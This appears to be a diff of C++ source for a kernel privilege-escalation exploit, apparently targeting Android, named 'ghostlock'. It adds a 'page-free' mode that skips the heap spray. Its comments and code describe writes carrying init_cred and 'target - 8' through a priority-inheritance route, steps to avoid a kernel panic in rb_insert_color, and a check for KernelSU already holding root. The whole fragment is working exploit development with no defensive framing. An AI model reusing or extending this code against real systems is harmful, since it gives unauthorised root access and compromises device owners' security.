@@ -657,6 +657,13 @@ namespace ghostlock::session::backend {
             if constexpr (!M::multicast) {
                 return true;
             } else {
+                /* Page-free Stage 3: W1's value comes from the profile's
+                 * scratch anchor, so the page's private scratch is never
+                 * dirtied and there is no page to repair. */
+                if (support::page_free_run()) {
+                    pr_info("W1b: page-free run, no private scratch page to repair\n");
+                    return true;
+                }
                 const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                 const uintptr_t w1_scratch_poison =
                         (session.heap.current.base) + mcast.buffer_size.value_or(0);
@@ -824,6 +831,12 @@ namespace ghostlock::session::backend {
             config::runtime_config_snapshot().debug_dir = debug_dir;
         if (!session.profile.loaded())
             attack::install_profile(decoded);
+        /* Page-free Stage 3: the mode is a per-run constant (policy ∧ scratch ∧
+         * anchor). Log it once, with the first missing conjunct when it is off,
+         * so an arm's identity is in the store rather than inferred from the
+         * absence of spray lines. */
+        pr_info("page_free=%d reason=%s\n",
+                support::page_free_run() ? 1 : 0, support::page_free_reason());
         /* Robustness guard: running the attack where KernelSU already owns root
          * drives the re-enforce path that panics the kernel at the first PI
          * route, and the objective is already met. Bail out cleanly instead; a
@@ -878,14 +891,26 @@ namespace ghostlock::session::backend {
          * no parent pointer, and the walk then enqueues -- rb_insert_color() reads
          * *(left) & 1 and dereferences a NULL grandparent when that word is even.
          * A zero write must therefore carry an odd pc. */
-        attack::timer_mark("  heap spray start");
-        (session.heap.current.base) = support::prepare_good_kernel_page(request);
-        if (!(session.heap.current.base)) {
-            pr_warning("  heap spray failed\n");
-            return 0;
+        if (support::page_free_run()) {
+            /* Page-free Stage 3: no spray, no leak, no page-acceptance gate.
+             * The write layout is still derived from this request -- W1/W1p
+             * carry the profile's scratch value, W2 carries init_cred, leaf
+             * writes carry target - 8 -- so the route stamps unchanged. */
+            attack::timer_mark("  page-free write start");
+            if (!support::prepare_page_free_context(request)) {
+                pr_warning("  page-free write context failed\n");
+                return 0;
+            }
+            attack::timer_mark("  page-free write ready");
+        } else {
+            attack::timer_mark("  heap spray start");
+            (session.heap.current.base) = support::prepare_good_kernel_page(request);
+            if (!(session.heap.current.base)) {
+                pr_warning("  heap spray failed\n");
+                return 0;
+            }
+            attack::timer_mark("  heap spray done");
         }
-
-        attack::timer_mark("  heap spray done");
         Status routed = route::middleware::run_middleware_route(session, request);
 
         attack::timer_mark("  PI route done");
